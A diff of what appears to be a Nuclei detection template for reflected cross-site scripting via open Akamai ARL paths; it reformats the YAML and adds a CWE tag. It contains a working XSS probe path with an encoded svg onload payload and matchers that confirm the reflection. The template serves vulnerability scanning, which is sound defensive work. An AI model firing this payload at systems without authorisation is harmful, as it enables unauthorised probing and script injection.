@@ -1,5 +1,4 @@
 id: akamai-arl-xss
-
 info:
   name: Open Akamai ARL - Cross-Site Scripting
   author: pdteam
@@ -14,26 +13,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-83
   metadata:
     max-request: 1
-  tags: akamai,xss,misconfig,vuln
-
+  tags: akamai,misconfig,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        condition: and
+  - matchers:
+      - condition: and
+        type: word
         words:
           - '"><svg onload=confirm(document.domain)>'
-          - 'Suggestions for improving the results'
-
-      - type: word
-        part: header
+          - Suggestions for improving the results
+      - part: header
+        type: word
         words:
-          - 'text/html'
-
+          - text/html
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E'
